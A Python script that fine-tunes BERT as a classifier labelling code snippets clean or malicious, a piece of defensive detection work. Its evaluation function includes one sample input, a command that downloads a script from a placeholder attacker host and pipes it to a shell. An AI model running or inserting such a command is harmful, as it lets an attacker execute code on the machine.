#!/usr/bin/env python3
"""
Fine-tune BERT base on Er1111c/Malicious_code_classification and export a HF model folder.

Usage:
  # install deps (CPU example)
  #   pip install -U datasets transformers accelerate evaluate scikit-learn torch

  # train (default output dir)
  python train_bert_classifier.py --outdir ./malicious-bert-base

  # evaluate an exported model dir
  python train_bert_classifier.py --outdir ./malicious-bert-base --eval-only
"""

import argparse
import os
from dataclasses import dataclass
from typing import Dict, Any

import numpy as np
import evaluate
from datasets import load_dataset
from packaging import version
from transformers import (
    AutoTokenizer,
    AutoModelForSequenceClassification,
    DataCollatorWithPadding,
    Trainer,
    TrainingArguments,
    set_seed,        # ← add this line
)

def load_data(seed: int = 42):
    # Dataset has splits 'train' and 'test' with columns: text (str), label (int 0/1)
    ds = load_dataset("Er1111c/Malicious_code_classification")
    # Drop empty/very long edge cases (rare) & normalize newlines
    def _clean(ex):
        t = (ex["text"] or "").replace("\r\n", "\n").strip()
        return {"text": t}
    ds = ds.map(_clean)
    # Shuffle for good measure
    ds["train"] = ds["train"].shuffle(seed=seed)
    return ds

def tokenize_dataset(ds, tokenizer):
    def tok(batch):
        return tokenizer(
            batch["text"],
            truncation=True,
            max_length=512,
        )
    return ds.map(tok, batched=True, remove_columns=[c for c in ds["train"].column_names if c not in ("label",)])

def compute_metrics_fn(eval_pred):
    from sklearn.metrics import accuracy_score, f1_score, precision_score, recall_score
    logits, labels = eval_pred
    preds = (logits.argmax(-1))
    return {
        "accuracy": accuracy_score(labels, preds),
        "precision": precision_score(labels, preds, zero_division=0),
        "recall": recall_score(labels, preds, zero_division=0),
        "f1": f1_score(labels, preds, zero_division=0),
    }

@dataclass
class ModelConfig:
    model_name: str = "bert-base-uncased"
    num_labels: int = 2
    id2label: Dict[int, str] = None
    label2id: Dict[str, int] = None

    def __post_init__(self):
        if self.id2label is None:
            self.id2label = {0: "CLEAN", 1: "MALICIOUS"}
        if self.label2id is None:
            self.label2id = {v: k for k, v in self.id2label.items()}

def train(args):
    set_seed(args.seed)
    ds = load_data(seed=args.seed)

    cfg = ModelConfig()
    tokenizer = AutoTokenizer.from_pretrained(cfg.model_name, use_fast=True)
    ds_tok = tokenize_dataset(ds, tokenizer)
    collator = DataCollatorWithPadding(tokenizer=tokenizer)

    model = AutoModelForSequenceClassification.from_pretrained(
        cfg.model_name,
        num_labels=cfg.num_labels,
        id2label=cfg.id2label,
        label2id=cfg.label2id,
    )

    steps_per_epoch = max(1, len(ds_tok["train"]) // args.per_device_train_batch_size)
    warmup_steps = int(0.06 * steps_per_epoch * args.num_train_epochs)

    common_kwargs = dict(
        output_dir=args.outdir,
        learning_rate=args.lr,
        per_device_train_batch_size=args.per_device_train_batch_size,
        per_device_eval_batch_size=args.per_device_eval_batch_size,
        num_train_epochs=args.num_train_epochs,
        weight_decay=0.01,
        logging_steps=25,
        fp16=args.fp16,
        gradient_accumulation_steps=args.grad_accum,
        report_to=[],  # avoid wandb/others
        warmup_steps=warmup_steps,
        save_total_limit=2,  # keep runs small
    )

    # Version-robust TrainingArguments: avoid eval/save strategy kwargs
    training_args = TrainingArguments(**common_kwargs)

    trainer = Trainer(
        model=model,
        args=training_args,
        train_dataset=ds_tok["train"],
        eval_dataset=ds_tok["test"],
        tokenizer=tokenizer,
        data_collator=collator,
        compute_metrics=compute_metrics_fn,
    )

    trainer.train()

    metrics = trainer.evaluate()   # explicit eval instead of evaluation_strategy
    print("Eval metrics:", metrics)

    trainer.save_model(args.outdir)
    tokenizer.save_pretrained(args.outdir)
    print(f"Model saved to: {args.outdir}")

def evaluate_only(args):
    from transformers import AutoModelForSequenceClassification, AutoTokenizer
    import torch
    cfg = ModelConfig()
    tokenizer = AutoTokenizer.from_pretrained(args.outdir, use_fast=True)
    model = AutoModelForSequenceClassification.from_pretrained(args.outdir)
    model.eval()
    if torch.cuda.is_available():
        model.to("cuda")
    # quick sanity example
    texts = [
        "import os; os.system('curl http://evil.tld/p | sh')",
        "def add(a,b): return a+b",
    ]
    toks = tokenizer(texts, truncation=True, max_length=512, return_tensors="pt", padding=True)
    if torch.cuda.is_available():
        toks = {k: v.cuda() for k, v in toks.items()}
    with torch.no_grad():
        out = model(**toks)
        probs = out.logits.softmax(-1).detach().cpu().numpy()
    for t, p in zip(texts, probs):
        print("==")
        print(t)
        print({"CLEAN": float(p[0]), "MALICIOUS": float(p[1])})

if __name__ == "__main__":
    parser = argparse.ArgumentParser()
    parser.add_argument("--outdir", type=str, default="./malicious-bert-base")
    parser.add_argument("--seed", type=int, default=42)
    parser.add_argument("--num-train-epochs", type=int, default=3)
    parser.add_argument("--per-device-train-batch-size", type=int, default=8)
    parser.add_argument("--per-device-eval-batch-size", type=int, default=16)
    parser.add_argument("--grad-accum", type=int, default=1)
    parser.add_argument("--lr", type=float, default=2e-5)
    parser.add_argument("--fp16", action="store_true")
    parser.add_argument("--eval-only", action="store_true")
    args = parser.parse_args()

    if args.eval_only:
        evaluate_only(args)
    else:
        train(args)
